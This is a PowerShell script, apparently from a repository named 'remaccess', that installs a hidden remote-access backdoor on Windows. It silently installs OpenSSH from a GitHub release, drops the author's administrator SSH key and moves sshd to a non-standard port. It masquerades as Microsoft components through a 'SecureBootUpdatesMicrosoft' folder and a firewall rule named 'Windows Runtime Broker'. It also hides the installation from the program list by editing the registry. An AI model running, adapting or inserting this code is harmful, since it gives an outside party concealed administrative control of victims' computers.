##Configureable variables.
$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/OpenSSHServer64.msi"
$authorizedkeyfile = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/administrators_authorized_keys"
$sshdconfigfile = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/sshd_config"
$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$packagename = "OpenSSH"
$VerboseOutput = $ture
$sshdirtorm = @("C:\ProgramData\ssh", "C:\Program Files\OpenSSH")
$serviceNames = @("sshd", "ssh-agent")
$sshdatadirectory = "C:\ProgramData\ssh"
$sshdconfigdestinationpath = "$sshdatadirectory\sshd_config"
$authorizedkeyfiledestinationpath = "$sshdatadirectory\administrators_authorized_keys"
$ProgramPath = "C:\Program Files\OpenSSH\sshd.exe"
$ruleDisplayNames = @("Windows Runtime Broker", "OpenSSH SSH Server Preview (sshd)")
$inprodrule = "Windows Runtime Broker"
$registryPathsToHide = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\5ED92DDF194F258428B685148F672E22\InstallProperties",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{FDD29DE5-F491-4852-826B-5841F876E222}"
)
$RegValueName = "SystemComponent"
$RegValueData = 1

#Verbosity Function.
function Write-VerboseMessage($message) {
    if ($VerboseOutput) {
        Write-Host $message
    }
}

#hash function.
function Download-File {
    param (
        [string]$downloadUrl,
        [string]$destinationPath
    )
    $hashUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
    $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
    if (Test-Path $destinationPath) {
        $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
        $hashesData = (iwr -Uri $hashUrl -UseBasicParsing).Content
        $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
        if ($hashesData -match $hashRegex) {
            $programHash = $matches[1]
        }
        if ($programHash -eq $existingFileHash) {
            Write-VerboseMessage "File is already present and matches the hash. No action needed."
        } else {
            Remove-Item -Path $destinationPath -Force
        }
    }
    if (-not (Test-Path $destinationPath)) {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
    }
}
#Cleanup before new-install.
Install-PackageProvider -Name NuGet -Force | Out-Null
Uninstall-Package $packagename -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
foreach ($directory in $sshdirtorm) {
    if (Test-Path $directory) {
        Remove-Item -Path $directory -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
	}}
foreach ($serviceName in $serviceNames) {
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        # Stop the service if it's running
        if (Get-Service -Name $serviceName | Where-Object { $_.Status -eq 'Running' }) {
            Stop-Service -Name $serviceName -Force | Out-Null
        }
        sc.exe delete $serviceName | Out-Null
    }
}

#installation of ssh
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
Download-File -downloadUrl $downloadUrl -destinationPath $destinationPath
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart" -Wait

#Modifying port in sshd_config
if (Test-Path $sshdconfigdestinationpath) {
    $configContent = Get-Content $sshdconfigdestinationpath -Raw
    if ($configContent -match 'Port 22') {
        $newConfigContent = $configContent -replace '#Port 22', 'Port 58769'
        Set-Content -Path $sshdconfigdestinationpath -Value $newConfigContent
		Write-Host "Port 22 replaced with Port 58769 in $sshdconfigdestinationpath"
    } else {
        Write-Host "Port 22 not found in $sshdconfigdestinationpath"
    }
} else {
    Write-Host "File $sshdconfigdestinationpath not found"
}

#Downloading config files
#Download-File -downloadUrl $sshdconfigfile -destinationPath $sshdconfigdestinationpath
Download-File -downloadUrl $authorizedkeyfile -destinationPath $authorizedkeyfiledestinationpath

#Fixing auth-key perm
$acl = Get-Acl  "$authorizedkeyfiledestinationpath"
$acl.SetAccessRuleProtection($true, $false)
$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
$acl.SetAccessRule($administratorsRule)
$acl.SetAccessRule($systemRule)
$acl | Set-Acl

#Firewall rule cleanup, before setting new. should be cleanup section but the script requires modifcations so don't change its placement.
$allRules = Get-NetFirewallRule
foreach ($ruleDisplayName in $ruleDisplayNames) {
    $matchedRule = $allRules | Where-Object { $_.DisplayName -eq $ruleDisplayName }
    if ($matchedRule) {
        Remove-NetFirewallRule -Name $matchedRule.Name
        Write-VerboseMessage "Removed firewall rule: $($matchedRule.DisplayName)"
    } else {
        Write-VerboseMessage "Rule not found: $ruleDisplayName"
    }
}

#Continuing with install
New-NetFirewallRule -Name $inprodrule -DisplayName $inprodrule -Action Allow -Enabled True -Direction Inbound -Program $ProgramPath -Profile @("Domain", "Private", "Public") | Out-Null
Write-VerboseMessage "Setting default shell to powershell" -ForegroundColor Green
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
Restart-Service sshd

#Hidding form program list.
foreach ($registryPath in $registryPathsToHide) {
    if (Test-Path $registryPath) {
        Set-ItemProperty -Path $registryPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
        Write-VerboseMessage "Hidden registry path: $registryPath"
    } else {
        Write-VerboseMessage "Registry path not found: $registryPath"
    }
}
